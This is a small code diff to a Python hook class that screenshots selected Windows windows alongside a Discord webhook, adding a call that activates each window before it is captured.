@@ -39,6 +39,7 @@ class SSHook(Hook):
         whook = DiscordWebhook(url=self.url)
         for e in eligibles.values():
             e : gw.Win32Window
+            e.activate()
             img = pag.screenshot(region=(e.left, e.top, e.width, e.height))
             self.__results.append((e, img))
 
